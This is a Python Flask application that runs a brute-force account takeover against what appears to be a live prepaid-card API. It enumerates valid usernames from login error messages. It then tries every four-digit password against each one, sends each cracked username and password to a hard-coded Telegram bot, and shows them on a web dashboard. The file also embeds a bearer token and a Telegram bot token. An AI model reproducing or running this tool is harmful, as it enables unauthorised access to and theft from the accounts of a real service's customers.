from flask import Flask, render_template, jsonify, send_file
import requests
import random
import time
import json
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

app = Flask(__name__)

# Global variables to track progress
current_step = "Initializing"
valid_usernames = [] # Usernames found to be valid for password attempts
tried_passwords = {} # Dictionary: username -> set of passwords tried for this username
current_username = "" # The username currently being processed for passwords
total_requests = 0 # Total requests for the *current* operation (username scan batch or password batch)
processed_requests = 0 # Processed requests for the *current* operation
is_running = False
success_info = [] # Global list holding successful attempts

# Configuration
API_URL = "https://bc.red-radius.com/api/v1/prepaid-cards"
AUTH_HEADER = "Bearer 1|qkzMyzrJjNKSekHzcmL9QIT80pZsHRJLFp9EWyE198d26f1d"
LANGUAGE = "ar"
STATE_FILE = "bruteforce_state.json"
SUCCESS_FILE = "successes.json" # File to save successful attempts

# Telegram Configuration
BOT_TOKEN = "5540358750:AAEbbNLxeyj3IwAn90Jumy5C5a1qTbTzzM"
CHAT_ID = "962451110"

# --- State Management (Valid Usernames & Tried Passwords) ---
def load_state():
    """Loads valid usernames and tried passwords from the state file."""
    if os.path.exists(STATE_FILE) and os.path.getsize(STATE_FILE) > 0:
        try:
            with open(STATE_FILE, 'r') as f:
                state = json.load(f)
                loaded_usernames = state.get("valid_usernames", [])
                loaded_tried_passwords = {}
                # Convert lists of passwords back to sets
                for user, passwords_list in state.get("tried_passwords", {}).items():
                    loaded_tried_passwords[user] = set(passwords_list)
                print(f"Loaded state from {STATE_FILE}")
                return loaded_usernames, loaded_tried_passwords
        except json.JSONDecodeError as e:
            print(f"Warning: Could not decode JSON from {STATE_FILE}: {e}. Starting state fresh.")
            return [], {}
        except Exception as e:
             print(f"Error loading state from {STATE_FILE}: {e}. Starting state fresh.")
             return [], {}
    print(f"State file {STATE_FILE} not found or is empty. Starting state fresh.")
    return [], {}

def save_state():
    """Saves valid usernames and tried passwords to the state file."""
    # Convert sets of passwords to lists for JSON serialization
    serializable_tried_passwords = {}
    for user, passwords_set in tried_passwords.items():
        serializable_tried_passwords[user] = list(passwords_set)

    state = {
        "valid_usernames": valid_usernames,
        "tried_passwords": serializable_tried_passwords
    }
    try:
        with open(STATE_FILE, 'w') as f:
            json.dump(state, f, indent=4)
        # print(f"State saved to {STATE_FILE}") # Optional: log every save
    except Exception as e:
        print(f"Error saving state to {STATE_FILE}: {e}")


# --- State Management for Successes ---
def load_successes():
    """Loads successful attempts from the successes file."""
    if os.path.exists(SUCCESS_FILE) and os.path.getsize(SUCCESS_FILE) > 0:
        try:
            with open(SUCCESS_FILE, 'r') as f:
                successes = json.load(f)
                print(f"Loaded {len(successes)} successes from {SUCCESS_FILE}")
                return successes
        except json.JSONDecodeError as e:
            print(f"Warning: Could not decode JSON from {SUCCESS_FILE}: {e}. Starting successes fresh.")
            return []
        except Exception as e:
             print(f"Error loading successes from {SUCCESS_FILE}: {e}. Starting successes fresh.")
             return []
    print(f"Successes file {SUCCESS_FILE} not found or is empty. Starting successes fresh.")
    return []

def save_success(success_entry):
    """Appends a new success entry to the successes file and global list."""
    global success_info # Access the global list
    # Add to the in-memory list if it's not already there (handle potential duplicates if re-loading state)
    if not any(s['username'] == success_entry['username'] and s['password'] == success_entry['password'] for s in success_info):
        success_info.append(success_entry)
        try:
            # Save the entire updated list to the file
            with open(SUCCESS_FILE, 'w') as f:
                json.dump(success_info, f, indent=4)
            print(f"Saved success for {success_entry['username']}/{success_entry['password']} to {SUCCESS_FILE}")
        except Exception as e:
            print(f"Error saving successes to file {SUCCESS_FILE}: {e}")
    # Else: It's already in memory/file, do nothing


# --- Telegram Notification Function ---
def send_telegram_success_notification(success_entry):
    """Sends a success notification to the configured Telegram chat."""
    # Escape special characters for MarkdownV2: _, *, [, ], (, ), ~, `, >, #, +, -, =, |, {, }, ., !
    def escape_markdown_v2(text):
        if not isinstance(text, str):
            text = str(text)
        escape_chars = r'_*[]()~`>#+-=|{}.!'
        return ''.join('\\' + char if char in escape_chars else char for char in text)

    message_text = f"""
🎉 Bruteforce Success Found! 🎉

*Username*: `{escape_markdown_v2(success_entry.get('username', 'N/A'))}`
*Password*: `{escape_markdown_v2(success_entry.get('password', 'N/A'))}`
*Status*: `{escape_markdown_v2(success_entry.get('status', 'N/A'))}`
*Duration*: `{escape_markdown_v2(success_entry.get('duration', 'N/A'))}`
*Remaining*: `{escape_markdown_v2(success_entry.get('remaining', 'N/A'))}`
*Timestamp*: `{escape_markdown_v2(success_entry.get('timestamp', 'N/A'))}`
"""
    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message_text,
        "parse_mode": "MarkdownV2" # Use MarkdownV2 for formatting
    }
    try:
        # Use a separate, non-blocking request if possible, or a small timeout
        response = requests.post(telegram_url, json=payload, timeout=10)
        response.raise_for_status() # Raise an HTTPError for bad responses (4xx or 5xx)
        # print(f"Telegram notification sent successfully for {success_entry['username']}") # Optional: log every notification
    except requests.exceptions.RequestException as e:
        print(f"Error sending Telegram notification for {success_entry.get('username', 'N/A')}: {e}")
    except Exception as e:
        print(f"An unexpected error occurred while sending Telegram notification for {success_entry.get('username', 'N/A')}: {e}")


# --- Request Sending Function ---
def send_request(payload):
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Authorization": AUTH_HEADER,
        "Accept-Language": LANGUAGE
    }
    try:
        response = requests.post(API_URL, json=payload, headers=headers, timeout=30)
        response.raise_for_status() # Raise an HTTPError for bad responses (4xx or 5xx)
        return response.json(), payload
    except requests.exceptions.RequestException as e:
        # Catch specific requests exceptions for better error handling
        error_message = str(e)
        print(f"Request failed for payload {payload}: {error_message}")
        return {"error": error_message, "message": "Request failed"}, payload # Return a structured error response
    except Exception as e:
        # Catch any other unexpected errors
        error_message = str(e)
        print(f"An unexpected error occurred during request for payload {payload}: {error_message}")
        return {"error": error_message, "message": "Unexpected error"}, payload


# --- Password Brute-forcing Logic (Modified) ---
def try_passwords_batch(username, start_idx):
    """
    Tries all 1000 passwords within the range starting at start_idx,
    skipping those already marked as tried.
    """
    global current_step, processed_requests, total_requests, success_info, tried_passwords

    # Passwords to try in this batch (all 1000 in the 1000-range)
    password_attempts = [str(i).zfill(4)
                         for i in range(start_idx, min(start_idx + 1000, 10000))]

    # Filter out passwords that have already been tried for this username
    passwords_to_send = [p for p in password_attempts
                         if username not in tried_passwords or p not in tried_passwords[username]]

    total_requests = len(passwords_to_send) # Total requests is now only the ones we haven't tried
    processed_requests = 0

    current_step = f"🔐 Trying passwords {start_idx:04d} - {min(start_idx + 999, 9999):04d} for: {username} ({len(passwords_to_send)} new attempts)"
    print(current_step)

    if not passwords_to_send:
        print(f"All passwords in range {start_idx:04d}-{min(start_idx + 999, 9999):04d} for {username} already tried. Skipping batch.")
        return False # No new passwords to try in this batch

    for password in passwords_to_send:
        payload = {"username": username, "password": password}

        result, sent_payload = send_request(payload)
        processed_requests += 1

        # Check for success message (or absence of known error message)
        # Assuming success is indicated by a message *not* being the specific error or a request error
        if result and result.get("message") not in ["خطأ في إسم المستخدم أو كلمة المرور", "Request failed", "Unexpected error"]:
             # Success found!
             success_entry = {
                 "username": username,
                 "password": password,
                 "status": result.get("status", "Success"),
                 "duration": result.get("duration", "N/A"),
                 "remaining": result.get("remaining", "N/A"),
                 "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
             }

             # --- Send Telegram Notification ---
             send_telegram_success_notification(success_entry)
             # ------------------------------------

             save_success(success_entry) # Save to file and update in-memory list
             current_step = f"🎉 SUCCESS found for {username} with password {password}!"
             print(current_step)

             # Save state immediately after a success to record tried passwords up to this point
             # before potentially moving to the next user or stopping.
             save_state()
             return True # Indicate success, move to next username

        # If the request failed or returned the specific "incorrect password" message,
        # mark this combination as tried.
        elif result and (result.get("message") == "خطأ في إسم المستخدم أو كلمة المرور" or "error" in result):
            tried_passwords.setdefault(username, set()).add(password)
            # Optional: print failed attempts if needed for debugging
            # print(f"Failed/Error for {username}/{password}. Marked as tried.")


    # If loop finishes without finding success in this 1000-password batch
    # Save state after trying a full batch for a user (even if no success in this batch)
    # This saves the newly added failed attempts for this batch.
    save_state() # Save after a batch is complete
    return False


# --- Background Processing Thread ---
def background_process():
    global current_step, valid_usernames, total_requests, processed_requests, is_running, current_username, success_info, tried_passwords

    # Load existing state and successes on startup
    loaded_usernames, loaded_tried_passwords = load_state()
    valid_usernames.extend(loaded_usernames) # Add loaded usernames to current list
    tried_passwords.update(loaded_tried_passwords) # Merge loaded tried passwords

    success_info.extend(load_successes()) # Add loaded successes to current list

    print("Background process started.")
    print(f"Loaded {len(valid_usernames)} valid usernames from state.")
    print(f"Loaded {sum(len(p) for p in tried_passwords.values())} tried password attempts from state.")
    print(f"Loaded {len(success_info)} successes from file.")


    while True:
        if is_running:
            try:
                # --- Phase 1: Scan for potential valid usernames ---
                current_step = "🔍 Scanning usernames concurrently..."
                print(current_step)
                prefix = "20" # Based on original code
                # Generate a new batch of usernames to test
                usernames_to_scan = [f"{prefix}{random.randint(100000, 999999)}" for _ in range(1000)]
                payloads = [{"username": u} for u in usernames_to_scan]
                total_requests = len(payloads)
                processed_requests = 0
                newly_found_valid_usernames_count = 0

                # Using ThreadPoolExecutor for scanning
                with ThreadPoolExecutor(max_workers=30) as executor: # Adjusted max_workers
                    futures = {executor.submit(send_request, payload): payload for payload in payloads}

                    for future in as_completed(futures):
                        payload = futures[future]
                        try:
                            result, _ = future.result()
                            processed_requests += 1
                            # Identify potentially valid usernames based on the specific error message
                            if result and result.get("message") == "خطأ في إسم المستخدم أو كلمة المرور":
                                username = payload["username"]
                                if username not in valid_usernames: # Avoid duplicates
                                     valid_usernames.append(username)
                                     newly_found_valid_usernames_count += 1 # Track newly found
                                     # print(f"Valid username candidate found: {username}") # Optional: print candidates

                        except Exception as e:
                            print(f"Username scan request error for {payload.get('username', 'N/A')}: {e}")

                # Save state if new valid usernames were found
                if newly_found_valid_usernames_count > 0:
                     save_state() # Save the updated valid usernames list and tried passwords
                     current_step = f"✅ Found {newly_found_valid_usernames_count} new valid usernames. Total: {len(valid_usernames)}"
                     print(current_step)
                else:
                     current_step = f"🔍 Scanned {len(usernames_to_scan)} usernames. No new valid candidates found in this batch. Total valid: {len(valid_usernames)}"
                     print(current_step)


                # --- Phase 2: Try passwords for discovered valid usernames ---
                # Iterate through the list of valid usernames.
                # Use a copy [:] to iterate in case the list is modified elsewhere (unlikely, but safe)
                # Iterate through valid usernames starting from the beginning of the list each cycle.
                for username in valid_usernames[:]:
                    current_username = username
                    # Check if this username already has a success entry in the global list
                    if any(s['username'] == username for s in success_info):
                         # print(f"Skipping username {username}, success already found.")
                         continue # Skip if already successful

                    # Iterate through password ranges (0-999, 1000-1999, ..., 9000-9999)
                    # try_passwords_batch will try passwords within the range that haven't been marked as tried
                    success_for_user_found = False
                    for start_idx in range(0, 10000, 1000):
                         # Check if *any* passwords in this batch range (start_idx to start_idx+999)
                         # *could* potentially be tried (i.e., not all 1000 are already marked as tried)
                         batch_range = range(start_idx, min(start_idx + 1000, 10000))
                         all_in_batch_tried = all(
                             str(i).zfill(4) in tried_passwords.get(username, set())
                             for i in batch_range
                         )

                         if all_in_batch_tried:
                            # print(f"All passwords in range {start_idx:04d}-{min(start_idx + 999, 9999):04d} for {username} already tried. Skipping range.")
                            continue # Skip this password batch range entirely

                        # If there are potentially untried passwords in this batch range, try them
                         if try_passwords_batch(username, start_idx):
                            success_for_user_found = True
                            break # Success found for this username, move to the next valid username

                        # If no success in this batch (up to 1000 attempts), wait before the next batch (next 1000 range)
                        # print(f"No success in batch {start_idx:04d}-{min(start_idx + 999, 9999):04d} for {username}. Waiting 60s before next range.")
                        current_step = f"🛌 Waiting 60s before trying next batch ({start_idx+1000:04d}-...) for {username}"
                        time.sleep(60)


                    if not success_for_user_found:
                         print(f"Finished all password ranges for {username} without success in this run or all possible passwords tried.")
                    # Important: Save state after processing each user if needed,
                    # but try_passwords_batch already saves after each batch of 1000 and on success.
                    # An additional save here might be redundant but adds robustness.
                    # save_state()


                current_step = "😴 Sleeping before next scan cycle..."
                print(current_step)
                save_state() # Final state save before a longer sleep
                time.sleep(600) # Sleep longer between full cycles


            except Exception as e:
                current_step = f"Fatal Error in background process: {str(e)}"
                print(current_step)
                # Save state on error might help recover progress
                save_state()
                # Avoid tight loop on error
                time.sleep(60)
        else:
            # App is not running, just sleep
            current_step = "🛑 Process is stopped."
            time.sleep(5)

# --- Flask Routes ---
@app.route('/')
def home():
    # The global variables are updated by the background thread.
    return render_template(
        'index.html',
        current_step=current_step,
        valid_usernames=valid_usernames, # Pass the global list
        progress=(processed_requests / total_requests * 100) if total_requests > 0 else 0,
        success_info=success_info # Pass the global list
    )

@app.route('/state.json')
def get_state_file():
    """Endpoint to download the username state file."""
    if os.path.exists(STATE_FILE):
        return send_file(STATE_FILE, as_attachment=True)
    else:
        return jsonify({"error": "State file not found"}), 404

@app.route('/successes.json')
def get_success_file():
    """Endpoint to download the successes file."""
    if os.path.exists(SUCCESS_FILE):
        return send_file(SUCCESS_FILE, as_attachment=True)
    else:
        return jsonify({"error": "Successes file not found"}), 404


@app.route('/status')
def status():
    """Endpoint to get current status and data as JSON for UI updates."""
    # Calculate total number of tried passwords across all users for display? Optional.
    total_tried_count = sum(len(p) for p in tried_passwords.values())
    return jsonify({
        'current_step': current_step,
        'valid_usernames': valid_usernames,
        'total_tried_passwords_count': total_tried_count, # Optional: include count
        'current_username': current_username,
        'progress': (processed_requests / total_requests * 100) if total_requests > 0 else 0,
        'is_running': is_running,
        'success_info': success_info # Include the global list of successes
    })

@app.route('/toggle')
def toggle():
    """Endpoint to start or stop the background process."""
    global is_running
    is_running = not is_running
    if is_running:
        current_step = "▶️ Process is starting..."
    else:
        current_step = "⏸️ Process is stopping..."
    print(current_step) # Log the change
    return jsonify({'is_running': is_running})

# --- Main Execution ---
if __name__ == '__main__':
    bg_thread = threading.Thread(target=background_process, daemon=True)
    bg_thread.start()
    # Run without debug for stability in production
    app.run(host='0.0.0.0', port=5000, debug=False)
